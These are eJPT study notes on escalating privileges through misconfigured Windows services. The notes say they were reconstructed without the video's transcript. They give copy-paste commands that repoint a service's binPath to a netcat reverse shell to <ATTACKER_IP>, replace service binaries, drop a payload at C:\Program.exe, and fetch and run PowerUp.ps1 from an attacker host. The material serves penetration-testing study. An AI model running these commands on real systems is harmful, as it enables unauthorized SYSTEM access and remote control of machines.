# 03 - Frequently Exploited Windows Services (eJPT Study Notes)

Note: The transcript for this video is not provided. The following summary is based on the filename and typical eJPT coverage for Windows privilege escalation. Commands and flows are standard, conservative approaches for “frequently exploited” Windows service misconfigurations.

## What the video covers (Introduction / big picture)
- Why Windows services are prime targets for local privilege escalation.
- The three most common, exam-relevant service misconfigurations:
  - Unquoted service paths (space-containing paths not wrapped in quotes).
  - Weak service permissions (you can reconfigure service binary or settings).
  - Weak file permissions on the service executable or its directory (you can replace/modify the binary).
- How to enumerate, verify, and safely exploit each case to obtain SYSTEM.
- Quick tooling: built-ins (sc, wmic/PowerShell, icacls), Sysinternals (accesschk), and post-ex tools (PowerUp, WinPEAS).

## Flow (ordered)
1. Enumerate services and identify high-value ones (running as LocalSystem, auto-start, currently running).
2. Check for unquoted service paths with spaces.
3. Check service DACLs for change-config/start/stop permissions.
4. Check file/dir ACLs for write/modify on the service binary and parent folders.
5. Choose an abuse path:
   - Change binPath to an attacker-controlled command.
   - Replace a writable service binary with a malicious one.
   - Place a payload to exploit unquoted path search order.
6. Trigger the service (stop/start or restart) and catch your shell.
7. Verify SYSTEM and clean up (restore config/binaries if needed).

## Tools highlighted
- Built-in:
  - sc.exe (query/config/SDDL)
  - wmic / PowerShell (service inventory)
  - reg.exe (service registry keys)
  - icacls, takeown (ACLs and ownership)
  - net.exe (start/stop services)
- Sysinternals:
  - accesschk.exe (check permissions on services/files/dirs)
- Post-exploitation helpers:
  - PowerUp.ps1 (Invoke-AllChecks, Get-Service* checks, Invoke-ServiceAbuse)
  - WinPEAS (winpeasx64.exe)
  - Seatbelt.exe

## Typical command walkthrough (detailed, copy-paste friendly)

Replace placeholders before running:
- <SERVICE> = vulnerable service name (e.g., Spooler)
- <ATTACKER_IP> = your IP
- <LPORT> = your listener port (e.g., 4444)
- <PAYLOAD_EXE> = your payload path (e.g., C:\Users\Public\nc64.exe)
- <TARGET_EXE> = service binary path (from PathName/ImagePath)
- <TARGET_DIR> = directory containing the service binary

Listener (on attacker):
```
nc -lvnp <LPORT>
```

1) Enumerate services and identify candidates

- All services with details (PowerShell):
```
powershell -nop -c "Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName | Format-Table -AutoSize"
```

- High-value: running as LocalSystem:
```
powershell -nop -c "Get-CimInstance Win32_Service | Where-Object {$_.StartName -match 'LocalSystem'} | Select Name,State,PathName | ft -a"
```

- View one service’s config:
```
sc qc <SERVICE>
reg query "HKLM\SYSTEM\CurrentControlSet\Services\<SERVICE>" /v ImagePath
reg query "HKLM\SYSTEM\CurrentControlSet\Services\<SERVICE>" /v ObjectName
```

2) Find unquoted service paths (spaces, no quotes)

- PowerShell filter (reliable):
```
powershell -nop -c "Get-WmiObject Win32_Service | Where-Object { $_.PathName -and $_.PathName -notmatch '\"' -and $_.PathName -match ' ' } | Select-Object Name,StartName,PathName | ft -a"
```

- WMIC quick view (manual inspection):
```
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\"
```

3) Check service permissions (can we change config?)

- With Sysinternals accesschk (x64):
```
accesschk64.exe -uwcqv "Authenticated Users" *
accesschk64.exe -uwcqv "Users" *
```
Look for entries indicating SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS on <SERVICE>.

- Show SDDL (manual parsing):
```
sc sdshow <SERVICE>
```

4) Check file/dir ACLs (can we replace the binary?)

- On the binary:
```
icacls "<TARGET_EXE>"
```

- On the parent directories (inheritance may allow write):
```
icacls "<TARGET_DIR>"
```
Look for your user/group having (M) Modify, (W) Write, or (F) Full.

5) Exploitation paths

A. Weak service permissions (change binPath)
- Upload payload if needed (example: host nc64.exe from attacker and download):
```
powershell -nop -c "iwr http://<ATTACKER_IP>/nc64.exe -OutFile C:\Users\Public\nc64.exe"
```
- Repoint the service to your payload via cmd:
```
sc stop <SERVICE>
sc config <SERVICE> binPath= "C:\Windows\System32\cmd.exe /c <PAYLOAD_EXE> -e cmd.exe <ATTACKER_IP> <LPORT>"
sc start <SERVICE>
```
Note: there must be a space after binPath=.

- After shell, restore:
```
sc config <SERVICE> binPath= "<original ImagePath from sc qc>"
```

B. Weak file permissions on service binary (replace binary)
- Backup and replace:
```
copy "<TARGET_EXE>" "C:\Users\Public\orig_<SERVICE>.exe"
copy "<PAYLOAD_EXE>" "<TARGET_EXE>"
```
- Trigger:
```
sc stop <SERVICE>
sc start <SERVICE>
```
- Restore after use:
```
copy "C:\Users\Public\orig_<SERVICE>.exe" "<TARGET_EXE>"
```

C. Unquoted service path (dropper in search order)
- Determine unquoted path and segments from sc qc/reg query (e.g., C:\Program Files\Some App\Service Folder\service.exe).
- Potential search order drop locations (if writable):
  - C:\Program.exe
  - C:\Program Files\Some.exe
  - C:\Program Files\Some App\Service.exe
- Check write perms:
```
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Some App"
```
- Drop payload with the correct name into the highest-precedence writable location:
```
copy "<PAYLOAD_EXE>" "C:\Program.exe"
```
- Trigger:
```
sc stop <SERVICE>
sc start <SERVICE>
```

6) Verify and cleanup
- Confirm SYSTEM:
```
whoami /all
```
- Remove droppers, restore originals, revert service config.

7) One-shot automated enumeration (optional)
- PowerUp.ps1:
```
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerUp.ps1'); Invoke-AllChecks"
```
- WinPEAS:
```
winpeasx64.exe
```

## Practical tips
- Always verify the service StartName: targeting LocalSystem yields SYSTEM.
- For unquoted paths, you need both: an unquoted path and write access to one of the candidate directories.
- If you cannot stop/start a service, wait for a system restart or find a service you can control.
- Be careful with sc config binPath=. Include quotes properly and keep the space after the equals sign.
- Prefer minimally destructive payloads and restore the original state to avoid breaking the service.
- If accesschk isn’t available, rely on sc sdshow, icacls, and PowerShell Get-Acl for manual checks.
- If file is locked, try stopping the service first; if still locked, plan for startup-time replacement or another vector.

## Minimal cheat sheet (one-screen flow)
- Enumerate:
```
powershell -nop -c "Get-CimInstance Win32_Service | select Name,StartName,State,StartMode,PathName | ft -a"
```
- Unquoted paths:
```
powershell -nop -c "Get-WmiObject Win32_Service | ? { $_.PathName -and $_.PathName -notmatch '\"' -and $_.PathName -match ' ' } | select Name,StartName,PathName | ft -a"
```
- Service perms:
```
accesschk64.exe -uwcqv "Authenticated Users" *
```
- File/dir perms:
```
icacls "<TARGET_EXE>"
icacls "<TARGET_DIR>"
```
- Change binPath abuse:
```
sc stop <SERVICE>
sc config <SERVICE> binPath= "C:\Windows\System32\cmd.exe /c C:\Users\Public\nc64.exe -e cmd.exe <ATTACKER_IP> <LPORT>"
sc start <SERVICE>
```
- Replace binary abuse:
```
copy "<TARGET_EXE>" "C:\Users\Public\orig_<SERVICE>.exe"
copy "C:\Users\Public\nc64.exe" "<TARGET_EXE>"
sc stop <SERVICE> & sc start <SERVICE>
```
- Unquoted path drop:
```
copy "C:\Users\Public\nc64.exe" "C:\Program.exe"
sc stop <SERVICE> & sc start <SERVICE>
```
- Verify:
```
whoami /all
```

## Summary
This module focuses on the top three Windows service misconfigurations used in local privilege escalation: unquoted service paths, weak service permissions, and weak file permissions on service executables/directories. The core workflow is to enumerate service properties (path, account, state), test ACLs (service DACLs and filesystem ACLs), and then exploit via binPath reconfiguration, binary replacement, or unquoted path search order drops. Tools like sc, PowerShell/WMI, icacls, and accesschk provide everything needed to identify and validate vulnerabilities, while PowerUp/WinPEAS can automate checks.